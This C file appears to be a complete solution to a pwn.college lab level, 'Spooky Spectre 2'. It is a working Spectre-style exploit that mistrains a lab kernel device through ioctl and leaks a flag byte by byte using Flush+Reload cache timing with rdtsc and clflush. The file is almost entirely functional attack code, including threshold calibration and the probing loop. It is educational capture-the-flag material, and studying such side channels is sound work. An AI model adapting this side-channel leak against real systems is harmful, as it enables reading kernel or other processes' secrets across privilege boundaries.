// Microarchitecture Exploitation - Spooky Spectre 2
// https://pwn.college/system-security/speculative-execution/level9
// gcc -O0 -Wall -Wextra -o flag flag.c && vm exec ./flag
#define _GNU_SOURCE

#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <x86intrin.h>

#define DEVICE_PATH "/proc/pwncollege"

#define SHMEM_SIZE 0x100000UL
#define PAGE_SIZE 0x1000UL
#define NUM_PAGES 256
#define ATTEMPTS 1000
#define FLAG_OFFSET 0

static volatile unsigned char *shared_mem;

static inline uint64_t rdtsc_begin(void)
{
    _mm_lfence();
    uint64_t t = __rdtsc();
    _mm_lfence();
    return t;
}

static inline uint64_t rdtsc_end(void)
{
    unsigned aux;
    uint64_t t = __rdtscp(&aux);
    _mm_lfence();
    return t;
}

static inline void clflush(const volatile void *addr)
{
    _mm_clflush((const void *)addr);
    _mm_mfence();
}

static inline uint64_t measure(volatile unsigned char *addr)
{
    uint64_t start = rdtsc_begin();
    (void)*addr;
    return rdtsc_end() - start;
}

static void flush_all(void)
{
    for (unsigned i = 0; i < NUM_PAGES; ++i)
        clflush(shared_mem + (size_t)i * PAGE_SIZE);
}

static void attack(int fd, int target)
{
    // bound = shmem[0]
    shared_mem[0] = target;
    // training iterations = shmem[1]
    shared_mem[1] = 80;
    ioctl(fd, 0, 0);
}

static void probe(unsigned scores[256], uint64_t threshold)
{
    // Exclude value 0 because shared_mem[0] is always accessed by device_ioctl().
    for (unsigned value = 1; value < 256; ++value)
    {
        volatile unsigned char *addr =
            shared_mem + (size_t)value * PAGE_SIZE;

        if (measure(addr) <= threshold)
            ++scores[value];
    }
}

static unsigned find_best(const unsigned scores[256])
{
    unsigned best = 1;
    for (unsigned value = 2; value < 256; ++value)
    {
        if (scores[value] > scores[best])
            best = value;
    }
    return best;
}

static uint64_t calibrate_threshold(void)
{
    volatile unsigned char *addr =
        shared_mem + 0x80 * PAGE_SIZE;
    (void)*addr;

    uint64_t hit_total = 0;
    uint64_t miss_total = 0;

    for (unsigned i = 0; i < ATTEMPTS; ++i)
    {
        hit_total += measure(addr);
        clflush(addr);
        miss_total += measure(addr);
    }

    uint64_t hit = hit_total / ATTEMPTS;
    uint64_t miss = miss_total / ATTEMPTS;
    uint64_t threshold = (hit * 2 + miss) / 3;
    printf("calibration: hit=%lu miss=%lu threshold=%lu\n",
           hit, miss, threshold);

    return threshold;
}

static unsigned char leak_byte(int fd, int target, uint64_t threshold)
{
    unsigned rounds[256] = {0};

    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (;;)
    {
        unsigned scores[256] = {0};

        for (unsigned i = 0; i < ATTEMPTS; ++i)
        {
            // train step is optional...
            flush_all();
            attack(fd, target);
            probe(scores, threshold);
        }

        unsigned best = find_best(scores);

        // Skip non-printable characters
        if (!(0x20 <= best && best <= 0x7e))
            continue;
        // Skip if no hits
        if (scores[best] < 1)
            continue;

        clock_gettime(CLOCK_MONOTONIC, &t1);
        double elapsed_s = (double)(t1.tv_sec - t0.tv_sec) +
                           (double)(t1.tv_nsec - t0.tv_nsec) / 1e9;

        printf("[%.3fs] target=%-2d best=0x%02x ('%c') score=%u/%u\n",
               elapsed_s, target, best, best,
               scores[best], ATTEMPTS);
        if (++rounds[best] >= 3)
            return best;

        clock_gettime(CLOCK_MONOTONIC, &t0);
    }
}

static int open_device(void)
{
    int fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0)
        return -1;

    shared_mem = mmap(NULL, SHMEM_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (shared_mem == MAP_FAILED)
    {
        close(fd);
        return -1;
    }
    return fd;
}

int main(void)
{
    int fd = open_device();
    if (fd < 0)
        return 1;

    char flag[64] = {0};
    size_t len = 0;

    uint64_t threshold = calibrate_threshold();
    for (unsigned target = FLAG_OFFSET; target < FLAG_OFFSET + 64; ++target)
    {
        flag[len++] = leak_byte(fd, target, threshold);
        flag[len] = '\0';
        printf("%s\n", flag);
        if (flag[len - 1] == '}')
            break;
    }

    munmap((void *)shared_mem, SHMEM_SIZE);
    close(fd);
    return 0;
}
